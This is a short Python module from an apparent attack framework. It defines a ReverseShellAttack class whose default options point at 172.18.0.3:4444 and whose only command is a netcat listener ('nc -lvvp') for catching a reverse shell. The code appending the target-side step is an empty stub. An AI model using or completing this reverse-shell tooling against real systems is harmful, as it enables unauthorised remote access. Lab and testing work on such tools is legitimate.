from typing import Any, List

from attacks.attack import AttackOptions, Attack


class ReverseShellAttackOptions(AttackOptions):
    lhost: str = "Reverse target host or IP address"
    lport: str = "Reverse target port"

    def _set_defaults(self) -> None:
        self.lhost = "172.18.0.3"
        self.lport = "4444"


class ReverseShellAttack(Attack):
    options_class = ReverseShellAttackOptions

    def __init__(self, options=None, printer=None, ssh_client=None):
        super().__init__(options, printer, ssh_client)
        self.commands = [self._reverse_command()]
        self._append_command()

    def _reverse_command(self):
        return f"nc -lvvp {self.options.lport}"

    def _append_command(self):
        pass


def _set_custom_defaults(default_options):
    default_options["lhost"] = "172.18.0.3"
    default_options["lport"] = "4444"

    return default_options


def _set_custom_description(cls):
    cls.lhost = "Reverse target host or IP address"
    cls.lport = "Reverse target port"
